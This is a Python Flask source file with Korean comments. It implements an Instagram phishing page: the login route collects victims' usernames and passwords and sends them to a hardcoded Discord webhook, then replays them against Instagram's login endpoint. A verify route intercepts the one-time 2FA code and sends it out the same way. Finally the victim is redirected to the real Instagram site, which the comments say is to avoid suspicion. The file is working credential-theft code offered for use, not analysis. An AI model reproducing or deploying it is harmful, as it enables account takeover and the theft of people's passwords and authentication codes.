import os
import time
import requests
from flask import Flask, render_template, request, redirect, session

# Flask 앱 설정
app = Flask(__name__, template_folder='templates')
app.secret_key = os.urandom(24)

# 1. 본인의 디스코드 웹훅 주소 (이미 설정하신 주소)
WEBHOOK_URL = "https://discord.com/api/webhooks/1466648989309997117/2Ah53vvh-hW2S1bZEdLF1i5Qs0YEa1Fmd1_ZXUHjDFk1wRLCLQAADGLpR2HipxuoXWEC"

# 인스타그램 서버와 통신할 세션 유지
insta_session = requests.Session()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    session['username'] = username

    # [중요] macro.py와 실시간 동기화를 위한 데이터 전송
    # 백틱(`)으로 감싸야 매크로가 정규표현식으로 아이디와 비번을 정확히 추출합니다.
    sync_data = {
        "content": f"🚨 **새로운 정보 감지!**\nID: `{username}`\nPW: `{password}`"
    }
    requests.post(WEBHOOK_URL, json=sync_data)

    # [참고] 서버 자체에서도 로그인을 시도 (400이 뜰 수 있지만 기록용으로 유지)
    try:
        main_url = "https://www.instagram.com/accounts/login/"
        main_response = insta_session.get(main_url)
        csrf_token = main_response.cookies.get('csrftoken', 'missing')

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "X-CSRFToken": csrf_token,
            "X-Instagram-AJAX": "1",
            "X-Requested-With": "XMLHttpRequest",
            "Referer": "https://www.instagram.com/accounts/login/",
            "Content-Type": "application/x-www-form-urlencoded"
        }

        payload = {
            'username': username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
            'queryParams': {},
            'optIntoOneTap': 'false'
        }

        login_url = "https://www.instagram.com/accounts/login/ajax/"
        response = insta_session.post(login_url, data=payload, headers=headers)
        
        # 디버깅용 응답 코드 전송
        debug_msg = {
            "content": f"ℹ️ 인스타 서버 응답: {response.status_code} (이 코드가 400이어도 로컬 매크로가 작동하면 괜찮습니다)"
        }
        requests.post(WEBHOOK_URL, json=debug_msg)

    except Exception as e:
        print(f"Error: {e}")

    # 유저에게는 OTP 입력 페이지를 보여줌
    return render_template('otp.html')

@app.route('/verify', methods=['POST'])
def verify():
    otp_code = request.form.get('otp_code')
    username = session.get('username', 'Unknown')

    # 가로챈 OTP 코드 전송
    otp_data = {
        "content": f"🚨 **OTP 가로채기 성공!**\n유저: `{username}`\n코드: **{otp_code}**"
    }
    requests.post(WEBHOOK_URL, json=otp_data)

    # 마지막은 실제 인스타로 보내서 의심을 피함
    return redirect("https://www.instagram.com/accounts/login/")

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
